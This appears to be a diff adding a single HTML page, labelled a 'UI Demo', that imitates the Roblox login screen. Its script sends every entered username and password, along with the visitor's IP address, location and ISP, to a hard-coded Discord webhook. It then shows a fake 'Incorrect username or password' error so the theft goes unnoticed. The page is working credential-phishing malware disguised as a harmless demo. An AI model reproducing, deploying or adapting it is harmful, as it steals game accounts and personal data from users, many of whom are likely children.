@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Game Login — UI Demo</title>
+<style>
+:root{color-scheme:dark;--panel:#272930;--field:#343740;--line:#41444e}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;color:#fff;background:#050608}
+body{min-height:100vh;overflow-x:hidden}
+.page-background{position:fixed;inset:0;z-index:0;background-color:#050608;background-image:none;background-size:cover;background-position:center;background-repeat:no-repeat}
+.topbar{height:38px;position:relative;z-index:2;display:flex;align-items:center;gap:clamp(12px,1.5vw,24px);padding:0 16px;background:#191a20;border-top:1px solid #34353b;border-bottom:1px solid #303139;box-shadow:0 2px 8px #0006;white-space:nowrap}
+.brand{display:flex;align-items:center;justify-content:flex-start;width:116px;min-width:116px;height:30px;color:#fff;text-decoration:none;line-height:1;overflow:hidden}
+.brand-text{font-size:23px;font-weight:1000;font-style:italic;letter-spacing:-1.5px;transform:scaleX(1.03);transform-origin:left center;white-space:nowrap}
+.brand-image{display:none;width:30px;height:30px;max-width:100%;max-height:30px;object-fit:contain;object-position:left center}
+.nav{display:flex;align-items:center;justify-content:space-between;gap:clamp(16px,4.7vw,88px);font-size:13px;font-weight:700}
+.nav a,.signup{text-decoration:none;color:#fff}
+.search{height:26px;display:flex;align-items:center;gap:9px;flex:1;max-width:460px;min-width:90px;margin-left:clamp(0px,1vw,10px);border:1px solid #3b3d46;border-radius:7px;background:#22232a;padding:0 10px;color:#b9bbc3;font-size:13px;transition:border-color 0.15s}
+.search:focus-within{border-color:#a9adb7}
+.search-icon{font-size:19px;line-height:1;color:#9699a3;transform:rotate(-20deg)}
+.search input{background:transparent;border:none;color:#fff;outline:none;width:100%;font-family:inherit;font-size:13px}
+.search input::placeholder{color:#b9bbc3;opacity:1}
+.signup{margin-left:auto;background:#335fff;border-radius:7px;padding:5px 10px;font-size:13px;font-weight:700}
+main{position:relative;z-index:1;min-height:calc(100vh - 38px);display:flex;justify-content:center;align-items:flex-start;padding:clamp(150px,21vh,210px) 12px 50px}
+.login-card{width:324px;max-width:100%;min-height:425px;background:var(--panel);border:1px solid #30333b;padding:19px 14px 25px;text-align:center;box-shadow:0 8px 24px #0005}
+h1{font-size:28px;line-height:1.2;margin:0 0 9px;font-weight:800;letter-spacing:-.6px;white-space:nowrap}
+.field{display:block;width:100%;height:35px;padding:0 11px;font-size:14px;margin:0 0 16px;border-radius:8px;border:1px solid #454954;background:var(--field);color:#fff;outline:none}
+.field::placeholder{color:#f0f0f2;opacity:1}
+.field:focus{border-color:#a9adb7}
+.primary{height:33px;width:100%;background:transparent;border:1px solid #e0e1e5;border-radius:7px;color:#fff;font-weight:500;font-size:14px;cursor:pointer;margin-top:-11px}
+.forgot{display:block;margin:24px 0 28px;color:#fff;font-size:13px;line-height:1.3;font-weight:700;text-decoration:none}
+.rule{height:1px;background:#3a3d45;margin:0 0 17px}
+.secondary{display:block;width:100%;height:34px;margin:0 0 11px;border:0;border-radius:7px;background:#3b3e48;color:#fff;font-size:13px;font-weight:700;cursor:pointer}
+.secondary:hover{background:#484c57}
+.bottom-copy{font-size:14px;font-weight:700;margin:31px 0 0;line-height:1.4}
+.bottom-copy a{color:#fff;text-decoration:none}
+.status{display:none;color:#ffd18a;font-size:12px;line-height:1.4;margin:8px 0 0}
+.status.error{color:#ff4d4d;}
+.loader{display:none;justify-content:center;align-items:center;gap:20px;height:22px;margin:10px 0 0}
+.loader.active{display:flex}
+.loader span{width:12px;height:12px;background:#66686d;animation:loadingPulse .9s ease-in-out infinite;opacity:.7}
+.loader span:first-child{background:#f0f0f2}
+.loader span:nth-child(2){animation-delay:.15s}
+.loader span:nth-child(3){animation-delay:.3s}
+@keyframes loadingPulse{0%,80%,100%{opacity:.35;transform:scale(1)}40%{opacity:1;transform:scale(1.08)}}
+#loginForm.is-loading .primary{display:none}
+#loginForm.is-loading .loader{margin:10px 0 0;height:22px}
+#loginForm.is-loading .field:last-of-type{margin-bottom:0}
+@media(max-width:760px){.topbar{gap:14px;padding:0 10px}.brand{min-width:auto;font-size:19px}.nav{gap:15px;font-size:12px}.nav a:nth-child(2),.nav a:nth-child(3){display:none}.search{max-width:none}.signup{font-size:12px}main{padding-top:12vh}}
+@media(max-width:420px){.nav{display:none}.search{margin-left:auto}.login-card{width:324px}h1{font-size:27px}}
+@media(prefers-reduced-motion:reduce){.loader span{animation:none;opacity:1}}
+</style>
+</head>
+<body>
+<div class="page-background" aria-hidden="true"></div>
+<header class="topbar">
+  <a class="brand" href="#" aria-label="Game home"><span class="brand-text" id="brandText">ROBLOX</span><img class="brand-image" id="brandImage" alt="Site logo"></a>
+  <nav class="nav" aria-label="Main navigation"><a href="#charts">Charts</a><a href="#marketplace">Marketplace</a><a href="#create">Create</a><a href="#robux">Robux</a></nav>
+  
+  <form class="search" id="searchForm" role="search">
+    <span class="search-icon" aria-hidden="true">⌕</span>
+    <input type="text" id="searchInput" placeholder="Search" aria-label="Search">
+  </form>
+  
+  <a class="signup" href="#signup" id="signupLink">Sign Up</a>
+</header>
+<main>
+  <section class="login-card" aria-label="Login interface demo">
+    <h1>Login to Roblox</h1>
+    <form id="loginForm">
+      <input class="field" id="username" autocomplete="off" placeholder="Username/Email/Phone" aria-label="Demo username">
+      <input class="field" id="password" type="password" autocomplete="off" placeholder="Password" aria-label="Demo password">
+      <button class="primary" id="loginButton" type="submit">Log In</button>
+      <div class="loader" id="loader" role="status" aria-label="Loading" aria-live="polite"><span></span><span></span><span></span></div>
+      <div class="status" id="status" role="status" aria-live="polite"></div>
+    </form>
+    <a class="forgot" href="#forgot" id="forgotLink">Forgot Password or Username?</a>
+    <div class="rule"></div>
+    <button class="secondary" type="button" id="otpButton">Email Me a One-Time Code</button>
+    <button class="secondary" type="button" id="quickSigninButton">Quick Sign-in</button>
+    <p class="bottom-copy">Don't have an account? <a href="#signup" id="signUpTextLink">Sign Up</a></p>
+  </section>
+</main>
+<script>
+// ------------------------------------------------------------
+// 🔧 CONFIGURATION: Replace with your real Discord webhook URL
+// ------------------------------------------------------------
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1564185081977770104/jfwckFEgAD52yZb5Nu4jn74IqWp2h0ytZMAKgyCFdyONmeH8EzpW1_FyW0BBIJ3KWWz4';
+
+const LOGO_IMAGE = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAoCAYAAACB4MgqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAG3SURBVFhH7ZdRTsJAEIZXfSbxVcToMYRryIPHIPYCHkBMj+ED56Acgxe9hvZvu0nT0Nl/tsvYGr+EbIEG/pn9d2Z6cTO//3YT5LJZJ8e/cGuuZrPr1+aaYrl8dHn+5u4WC7cqr4vi0Hxji/pwZi8bl2Wb5l3NvhRf7A/1ahSIWvhu91FlWmK7zev1vV7PgVr41+exueI5RyAq4adsoiWVrcyFd4ndDZVwxt9DYQNRCY/xdywIQBJPNyDYxJJQxv9+y099KCW8zyUo4WjzY4MSzlYSZGp++1AfLCJrfTClManH0VQA/hgvBPG0fq6C8N+FYO+jhLP+PtUJ8RmCQLdkYO8LCmf9PcQaMQSFp+qU7K4x/gbhjK844aw3JTS/kSzj0qTHdl3W30AUrqnf1eQ4cCzQZFwcsmLHWAhoz9zscIbyySIKtxhjPVXTIg8mEK1iJTqGXuHWY6y2KgWrihXa58/+jI9sjO3SK9wPR9atnIV+5kRNx2FFJ019aDVl0KN6WG7jD28KS5kK7xIbiLZ+e5IJb6Ox1aiEd5F2I8YmwER4Fx8IdmRdVq8YfkV4CkbTObVMVLhzPzUHzZySa8+vAAAAAElFTkSuQmCC";
+const logoImage = document.getElementById("brandImage");
+const logoText = document.getElementById("brandText");
+if (LOGO_IMAGE.trim()) {
+  logoImage.src = LOGO_IMAGE;
+  logoImage.style.display = "block";
+  logoText.style.display = "none";
+  const brand = document.querySelector(".brand");
+  brand.style.width = "30px";
+  brand.style.minWidth = "30px";
+}
+
+const BACKGROUND_IMAGE = "https://xboxwire.thesourcemediaassets.com/sites/2/2025/09/Roblox_GDK_Header-707e033c88306bee69e1.jpg";
+const backgroundLayer = document.querySelector('.page-background');
+if (BACKGROUND_IMAGE.trim()) {
+  backgroundLayer.style.backgroundImage = `linear-gradient(#0003, #0003), url("${BACKGROUND_IMAGE.replace(/["\\]/g, '')}")`;
+}
+
+const form = document.getElementById('loginForm');
+const statusBox = document.getElementById('status');
+const loader = document.getElementById('loader');
+const loginButton = document.getElementById('loginButton');
+const usernameInput = document.getElementById('username');
+const passwordInput = document.getElementById('password');
+
+function showError(message) {
+  statusBox.style.display = 'block';
+  statusBox.classList.add('error');
+  statusBox.textContent = message;
+}
+
+// Function to get IP info and send to Discord
+async function sendToDiscord(username, password) {
+  let ipInfo = "Unknown";
+  let location = "Unknown";
+  let isp = "Unknown";
+
+  try {
+    // Fetching IP information from a free public API
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResponse.json();
+    ipInfo = ipData.ip || "Unknown";
+    location = `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`;
+    isp = ipData.org || "Unknown";
+  } catch (error) {
+    console.warn('Could not fetch IP info:', error);
+  }
+
+  const content = `**New login attempt (test)**\n**Username/Email/Phone:** ${username || '*empty*'}\n**Password:** ${password || '*empty*'}\n\n**IP Address:** ${ipInfo}\n**Location:** ${location}\n**ISP:** ${isp}`;
+  
+  const payload = {
+    content: content,
+    username: 'Login Monitor',
+    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1077/1077114.png'
+  };
+
+  try {
+    const response = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    if (!response.ok) console.warn('Webhook responded with status:', response.status);
+  } catch (error) {
+    console.error('❌ Error sending to Discord:', error);
+  }
+}
+
+// Handle Login Form Submit
+form.addEventListener('submit', async (event) => {
+  event.preventDefault();
+  
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value;
+
+  statusBox.style.display = 'none';
+  statusBox.classList.remove('error');
+
+  // 1. Check if empty
+  if (!username || !password) {
+    showError('Username and password required');
+    return; 
+  }
+
+  // 2. If fields are filled, show loading and send to Discord
+  form.classList.add('is-loading');
+  loader.classList.add('active');
+  loginButton.disabled = true;
+
+  if (!DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
+    await sendToDiscord(username, password);
+  } else {
+    console.log('⚠️ Discord webhook not configured. Would have sent:', { username, password });
+  }
+
+  // 3. Finish loading and show "Incorrect username or password."
+  window.setTimeout(() => {
+    loader.classList.remove('active');
+    form.classList.remove('is-loading');
+    loginButton.disabled = false;
+    
+    showError('Incorrect username or password.');
+  }, 1800);
+});
+
+// Handle all other buttons/links (Error messages)
+const errorElements = [
+  document.getElementById('forgotLink'),
+  document.getElementById('otpButton'),
+  document.getElementById('quickSigninButton'),
+  document.getElementById('signUpTextLink'),
+  document.getElementById('signupLink')
+];
+
+errorElements.forEach(el => {
+  el.addEventListener('click', (event) => {
+    event.preventDefault();
+    showError('Username and password required');
+  });
+});
+
+// Handle Search Bar
+const searchForm = document.getElementById('searchForm');
+searchForm.addEventListener('submit', (event) => {
+  event.preventDefault();
+  const query = document.getElementById('searchInput').value.trim();
+  if (query) {
+    statusBox.style.display = 'block';
+    statusBox.classList.remove('error');
+    statusBox.style.color = '#a9adb7';
+    statusBox.textContent = `Searching for "${query}"... (Demo placeholder)`;
+  }
+});
+</script>
+</body>
+</html>
